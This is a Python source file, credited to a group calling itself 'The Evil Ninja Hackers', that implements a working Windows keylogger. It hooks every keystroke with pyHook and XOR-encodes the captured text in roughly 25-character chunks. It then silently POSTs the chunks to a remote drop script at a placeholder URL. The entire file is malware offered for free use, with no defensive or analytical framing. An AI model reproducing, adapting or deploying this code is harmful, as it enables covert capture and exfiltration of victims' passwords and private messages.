###########################################################################
##Copyright (C) 2013 The Evil Ninja Hackers <ENH@lavabit.com>            ##
##                                                                       ##
## Permission is hereby granted, free of charge, to any person obtaining ##
## a copy of this software and associated documentation files (the       ##
## "Software"), to deal in the Software without restriction, including   ##
## without limitation the rights to use, copy, modify, merge, publish,   ##
## distribute, sublicense, and/or sell copies of the Software, and to    ##
## permit persons to whom the Software is furnished to do so, subject to ##
## the following conditions:                                             ##
##                                                                       ##
## The above copyright notice and this permission notice shall be        ##
## included in all copies or substantial portions of the Software.       ##
##                                                                       ##
## THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,       ##
## EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF    ##
## MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.##
## IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY  ##
## CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,  ##
## TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE     ##
## SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.                ##
###########################################################################
##Note:                                                                  ##
##  I love to create free software, and if you are reading this, you     ##
##  probably love using free software.  If you enjoyed this software,    ##
##  please send me an email saying you liked it.  I love to create free  ##
##  software, but what's even better than that is hearing that people    ##
##  like the software I create.                                          ##
###########################################################################

import pyHook
import urllib
import urllib2
import random
import string

prefix = 'AUTO'

nextid = prefix + ''.join([random.choice('abcdefghijklmnoprstuvwyxzABCDEFGHIJKLMNOPRSTUVWXYZ') for i in range(20)])
loggedchars = ''

def xorenc(ptext, key):
    rtntxt = ''
    keycnt = 0
    for char in ptext:
        addchr = hex(ord(char) ^ ord(key[keycnt]))[2:]
        if len(addchr) == 1:
            addchr = '0' + addchr
        rtntxt = rtntxt + addchr
        keycnt = keycnt + 1
        if keycnt > len(key)-1:
            keycnt = 0
    return rtntxt

def OnKeyboardEvent(event):
    global loggedchars
    if event.KeyID == 13:
        text = '\r\n'
    elif event.KeyID == 165:
        text = '[Alt]'
    elif event.KeyID == 8:
        text = '[Back]'
    elif event.KeyID == 16:
        text = ''
    elif event.KeyID == 37:
        text = '[LARROW]'
    elif event.KeyID == 39:
        text = '[RARROW]'
    elif event.KeyID == 38:
        text = '[UARROW]'
    elif event.KeyID == 40:
        text = '[DARROW]'
    elif event.KeyID == 91 or event.KeyID == 92:
        text = '[WINKEY]'
    else:
        if chr(event.Ascii) in string.printable:
            text = chr(event.Ascii)
        else:
            text = ''
    #-- Log --#
    if text != '[Back]':
        loggedchars = loggedchars + text
    else:
        loggedchars = loggedchars[:len(loggedchars)-1]
    if len(loggedchars) >= 25: #send it in ~25 char chunks.
        senddata(xorenc(loggedchars, 'thisiswhereyourkeygoes'))
        loggedchars = ''
    return True

def senddata(data):
    global nextid
    url = 'http://www.yoursite.com/droplogs.php'
    calcnextid = prefix + ''.join([random.choice('abcdefghijklmnoprstuvwyxzABCDEFGHIJKLMNOPRSTUVWXYZ') for i in range(20)])
    values = {'d' : data,
              'i' : nextid,
              'ni' : calcnextid,
            }
    nextid = calcnextid
    try:
        data = urllib.urlencode(values)          
        req = urllib2.Request(url, data)
        response = urllib2.urlopen(req)
        the_page = response.read()
    except Exception, detail: 
        exit(1) #Fail silently.



hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
if __name__ == '__main__':
    import pythoncom
    pythoncom.PumpMessages()

# :)
